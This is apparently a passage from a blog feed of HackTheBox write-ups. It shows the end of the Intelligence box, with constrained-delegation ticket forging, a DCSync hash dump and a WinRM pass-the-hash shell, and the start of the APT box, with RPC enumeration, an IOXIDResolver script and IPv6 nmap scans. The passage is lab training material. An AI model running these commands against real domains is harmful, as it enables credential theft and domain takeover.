<h4 id="abusing-constrained-delegation---silver-ticket">Abusing Constrained Delegation -&gt; Silver Ticket</h4>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">This site</a> explains what a constrained delegation is:</p>
<blockquote>
<p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it&rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p>
</blockquote>
<p>In this case, the service account <code>svc_int</code> can impersonate the domain admin and authenticate to <code>WWW/DC.INTELLIGENCE.HTB</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s2">&#34;Ted.Graves@intelligence.htb&#34;</span> -w <span class="s2">&#34;Mr.Teddy&#34;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;CN=svc_int,CN=Managed ServiceDC=intelligence,DC=htb&#34;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>With that, I can abuse this permission and perform <a href="https://attack.mitre.org/techniques/T1558/002/">Silver Ticket</a> attack, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ impacket-getST <span class="s1">&#39;intelligence.htb/svc_int$&#39;</span>  -spn <span class="s1">&#39;WWW\dc.intelligence.htb&#39;</span> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl">Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
</span></span></code></pre></div><p>To resolve that, I&rsquo;ll need to synchronize my machine time with the DC. This can be done with <code>ntpdate</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo apt install ntpdate <span class="o">&amp;&amp;</span> sudo ntpdate 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="m">18</span> Jul 14:57:39 ntpdate<span class="o">[</span>63324<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.10.248 offset +0.001305 sec
</span></span></code></pre></div><p>On the next attempt, I have obtained the admin ticket (TGS).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75»
</span></span><span class="line"><span class="cl">$ impacket-getST -spn <span class="s1">&#39;WWW/dc.intelligence.htb&#39;</span> -impersonate administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int<span class="se">\$</span>
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2self
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2Proxy
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache
</span></span></code></pre></div><h4 id="dcsync">DCSync</h4>
<p>Although the admin ticket was actually requested for <code>WWW\dc.intelligence.htb</code>, it actually can be used for other service, like DRS (Directory Replication Service) for DCSync attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache <span class="o">&amp;&amp;</span> impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:2362bc3191f23732
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span></code></pre></div><h4 id="shell-access">Shell Access</h4>
<p>With the administrator hash, I can use WinRM to get a shell access</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.248 -u <span class="s1">&#39;administrator&#39;</span> -H <span class="s1">&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">dc
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::a57a:d94f:fa40:87e6
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::a57a:d94f:fa40:87e6%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.248
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.254.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - APT</title>
      <link>https://fahmifj.github.io/hackthebox/apt/</link>
      <pubDate>Sat, 17 Apr 2021 00:09:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/apt/</guid>
      <description>Enumerating network interfaces of a remote computer via MSRPC and exploit NTLMv1</description>
      <content:encoded><![CDATA[<p>APT is an insane difficulty Windows machine from HackTheBox and it starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named <em>ServerAlive()</em> can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain  all the users&rsquo; hashes. Brute-force attack is performed to obtain one valid credentials from these hashes. With these credentials, I&rsquo;m able to send a query to the registry and obtain another set of credentials for remote access to the system. A PowerShell history reveals that the machine is configured to accept NTLMv1 authentication, which is then exploited to get Administrator access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>RPC enumeration</li>
<li>Port Forwarding</li>
<li>Remote Registry</li>
<li>Exploiting NTLMv1</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
<li>IOXIDResolver - <a href="https://github.com/mubix/IOXIDResolver">https://github.com/mubix/IOXIDResolver</a></li>
<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
<li>Socat</li>
<li>Kerbrute - <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></li>
<li>pyKerbrute - <a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></li>
<li>Responder - <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap---ipv4">Nmap - IPv4</h3>
<p>Both the initial scan and the full scan with <code>nmap</code> only discovers two open ports: HTTP with IIS server on port 80, and MSRPC on port 135.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/initial-apt <span class="s1">&#39;10.10.10.213&#39;</span> -v
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">80/tcp  open  http    Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Gigantic Hosting <span class="p">|</span> Home
</span></span><span class="line"><span class="cl">135/tcp open  msrpc   Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 on the browser shows up a website called &ldquo;Gigantic Hosting&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210415055156844.png" alt="image-20210415055156844"  /></div>
</p>
<p>The input vectors on <code>https://10.13.38.16/contact-post.html</code> don&rsquo;t appear to be neither vulnerable nor injectable.</p>
<p><div class="img-container"><img src="imgs/image-20210415061845703.png" alt="image-20210415061845703"  /></div>
</p>
<p>It sends a post request with an empty body to a host that can not be resolved by my network. Here is the request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">https://10.13.38.16/contact-post.html</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.13.38.16</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.10.213/support.html</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span></code></pre></div><p>I also did ran gobuster, but didn&rsquo;t find anything interesting.</p>
<h3 id="tcp-135---msrpc">TCP 135 - MSRPC</h3>
<p>Remote Procedure Call (RPC) allows applications to invoke a function (or procedure or subroutine) of a remote computer without having to understand the network’s details, and MSRPC is Microsoft’s enhanced version of <a href="https://en.wikipedia.org/wiki/DCE/RPChttps://en.wikipedia.org/wiki/DCE/RPC">DCE/RPC</a>. MSRPC works together with the Distributed Component Object Model (DCOM), and DCOM provides a mechanism for exposing application objects and it consists of a set of RPC interfaces that can be implemented over any RPC Transport.</p>
<p>DCOM and RPC endpoint mapper sit on port 135 (both of them run on the shared process of <code>svchost.exe</code>). The RPC endpoint mapper maintains the <strong>database of endpoints</strong> that clients use to map an interface to endpoints, and there is a tool called <code>rpcdump.py</code> from Impacket that can be used to dump those endpoints:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72»
</span></span><span class="line"><span class="cl">$ rpcdump.py -port <span class="m">135</span> <span class="s1">&#39;10.10.10.213&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving endpoint list from 10.10.10.213
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RSP<span class="o">]</span>: Remote Shutdown Protocol
</span></span><span class="line"><span class="cl">Provider: wininit.exe
</span></span><span class="line"><span class="cl">UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
</span></span><span class="line"><span class="cl">Bindings:
</span></span><span class="line"><span class="cl">          ncacn_ip_tcp:10.10.10.213<span class="o">[</span>49664<span class="o">]</span>
</span></span><span class="line"><span class="cl">          ncalrpc:<span class="o">[</span>WindowsShutdown<span class="o">]</span>
</span></span><span class="line"><span class="cl">          ncacn_np:<span class="se">\\</span>APT<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\I</span>nitShutdown<span class="o">]</span>
</span></span><span class="line"><span class="cl">          ncalrpc:<span class="o">[</span>WMsgKRpc06C4F0<span class="o">]</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Received <span class="m">265</span> endpoints.
</span></span></code></pre></div><p><code>ncacn_http</code>, <code>ncacn_np</code>, <code>ncacn_ip_tcp</code> are known as <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/selecting-a-protocol-sequence">protocol string/protocol sequence</a>.</p>
<h4 id="scan-for-listening-rpc-interfaces">Scan for Listening RPC Interfaces</h4>
<p>I can use <code>rpcmap.py</code>, which also from Impacket, to get a list of currently listening RPC interfaces that are accessible over TCP/IP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72»
</span></span><span class="line"><span class="cl">$ rpcmap.py <span class="s1">&#39;ncacn_ip_tcp:10.10.10.213[135]&#39;</span> -brute-uuid
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-DCOM<span class="o">]</span>: Distributed Component Object Model <span class="o">(</span>DCOM<span class="o">)</span> Remote
</span></span><span class="line"><span class="cl">Provider: rpcss.dll
</span></span><span class="line"><span class="cl">UUID: 000001A0-0000-0000-C000-000000000046 v0.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-DCOM<span class="o">]</span>: Distributed Component Object Model <span class="o">(</span>DCOM<span class="o">)</span> Remote
</span></span><span class="line"><span class="cl">Provider: rpcss.dll
</span></span><span class="line"><span class="cl">UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-DCOM<span class="o">]</span>: Distributed Component Object Model <span class="o">(</span>DCOM<span class="o">)</span> Remote
</span></span><span class="line"><span class="cl">Provider: rpcss.dll
</span></span><span class="line"><span class="cl">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tested <span class="m">354</span> UUID<span class="o">(</span>s<span class="o">)</span>
</span></span></code></pre></div><p>From the results above, three of them are the interfaces provided by DCOM, details of these interfaces are documented by Microsoft in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">well-known UUIDs</a>.</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>GUID</th>
<th>Purpose</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td>IID_IRemoteSCMActivator</td>
<td>{000001A0-0000-0000-C000-000000000046}</td>
<td>RPC interface UUID for IRemoteSCMActivator</td>
<td>RemoteSCMActivator is another remote activation interface of the DCOM Remote Protocol.</td>
</tr>
<tr>
<td>IID_IActivation</td>
<td>{4d9f4ab8-7d1c-11cf-861e-0020af6e7c57}</td>
<td>RPC interface UUID for IActivation</td>
<td>IActivation is the DCOM Remote Protocol remote activation interface supported on all versions of the DCOM Remote Protocol</td>
</tr>
<tr>
<td>IID_IObjectExporter</td>
<td>{99fcfec4-5260-101b-bbcb-00aa0021347a}</td>
<td>RPC interface UUID for IObjectExporter</td>
<td>IObjectExporter is the interface used for OXID resolution, pinging, and <strong>server aliveness</strong> tests. All object resolvers MUST support the IObjectExporter interface</td>
</tr>
</tbody>
</table>
<h4 id="network-interfaces-enumeration">Network Interfaces Enumeration</h4>
<p>According to this <a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">post</a>, written by Nicolas Delhaye, the  <code>ServerAlive2()</code> method in IObjectExport (also known as IOXIDResolver) interface can be used to retrieve a list of network interfaces of a remote computer. Nicolas also provides the PoC for this.</p>
<p><div class="img-container"><img src="imgs/image-20210415065746943.png" alt="image-20210415065746943"  title="List of available methods in IObjectExport interface. "  /></div>
</p>
<blockquote>
<p>Opnum is operation number to identify a specific rpc method or a method in an interface.</p>
</blockquote>
<p>I can use <code>rpcmap.py</code> with <code>-brute-opnums</code> option to determine which interface&rsquo;s methods are accessible, and the IObjectExport interface shows that Opnum 3 and Opnum 5 are accessible, this means access to <code>ServerAlive()</code> function is allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «rpc-enum» «10.10.14.72»
</span></span><span class="line"><span class="cl">$ rpcmap.py -brute-opnums -opnum-max <span class="m">5</span> <span class="s1">&#39;ncacn_ip_tcp:10.10.10.213&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-DCOM<span class="o">]</span>: Distributed Component Object Model <span class="o">(</span>DCOM<span class="o">)</span> Remote
</span></span><span class="line"><span class="cl">Provider: rpcss.dll
</span></span><span class="line"><span class="cl">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
</span></span><span class="line"><span class="cl">Opnum 0: rpc_x_bad_stub_data
</span></span><span class="line"><span class="cl">Opnum 1: rpc_x_bad_stub_data
</span></span><span class="line"><span class="cl">Opnum 2: rpc_x_bad_stub_data
</span></span><span class="line"><span class="cl">Opnum 3: success
</span></span><span class="line"><span class="cl">Opnum 4: rpc_x_bad_stub_data
</span></span><span class="line"><span class="cl">Opnum 5: success
</span></span></code></pre></div><p>From here, I can use the provided PoC script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">getopt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">impacket.dcerpc.v5</span> <span class="kn">import</span> <span class="n">transport</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.rpcrt</span> <span class="kn">import</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.dcomrt</span> <span class="kn">import</span> <span class="n">IObjectExporter</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">opts</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">getopt</span><span class="o">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span><span class="s2">&#34;ht:&#34;</span><span class="p">,[</span><span class="s2">&#34;target=&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">getopt</span><span class="o">.</span><span class="n">GetoptError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s1">&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">target_ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.1&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">opt</span><span class="p">,</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="s1">&#39;-h&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">opt</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&#34;-t&#34;</span><span class="p">,</span> <span class="s2">&#34;--target&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">target_ip</span> <span class="o">=</span> <span class="n">arg</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">authLevel</span> <span class="o">=</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">stringBinding</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;ncacn_ip_tcp:</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">target_ip</span>
</span></span><span class="line"><span class="cl">    <span class="n">rpctransport</span> <span class="o">=</span> <span class="n">transport</span><span class="o">.</span><span class="n">DCERPCTransportFactory</span><span class="p">(</span><span class="n">stringBinding</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">portmap</span> <span class="o">=</span> <span class="n">rpctransport</span><span class="o">.</span><span class="n">get_dce_rpc</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">portmap</span><span class="o">.</span><span class="n">set_auth_level</span><span class="p">(</span><span class="n">authLevel</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">portmap</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">objExporter</span> <span class="o">=</span> <span class="n">IObjectExporter</span><span class="p">(</span><span class="n">portmap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bindings</span> <span class="o">=</span> <span class="n">objExporter</span><span class="o">.</span><span class="n">ServerAlive2</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Retrieving network interface of &#34;</span> <span class="o">+</span> <span class="n">target_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">binding</span> <span class="ow">in</span> <span class="n">bindings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">NetworkAddr</span> <span class="o">=</span> <span class="n">binding</span><span class="p">[</span><span class="s1">&#39;aNetworkAddr&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Address: &#34;</span> <span class="o">+</span> <span class="n">NetworkAddr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</span></span></code></pre></div><p>The script returns with two IPv6 addresses of the machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «rpc-enum» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ ./IOXIDResolver.py -t <span class="s1">&#39;10.10.10.213&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving network interface of 10.10.10.213
</span></span><span class="line"><span class="cl">Address: apt
</span></span><span class="line"><span class="cl">Address: 10.10.10.213
</span></span><span class="line"><span class="cl">Address: dead:beef::b885:d62a:d679:573f
</span></span><span class="line"><span class="cl">Address: dead:beef::89df:c1d4:6aaf:67ce
</span></span></code></pre></div><p>I will add these addresses to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «rpc-enum» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;dead:beef::b885:d62a:d679:573f apt&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h3 id="nmap---ipv6">Nmap - IPv6</h3>
<p>I will run another nmap scan against the machine on the IPv6 address.</p>
<blockquote>
<p>For me, scanning these two addresses returns the same results.</p>
</blockquote>
<p>This time,  <code>nmap</code> shows the common ports of Active Directory domain controller.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ nmap -6 --min-rate <span class="m">1000</span> -sC -sV -oA nmap/initial-apt-ipv6 <span class="s1">&#39;dead:beef::b885:d62a:d679:573f&#39;</span> -v
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">53/tcp  open  domain?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSVersionBindReqTCP: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     version
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    <span class="nb">bind</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http         Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
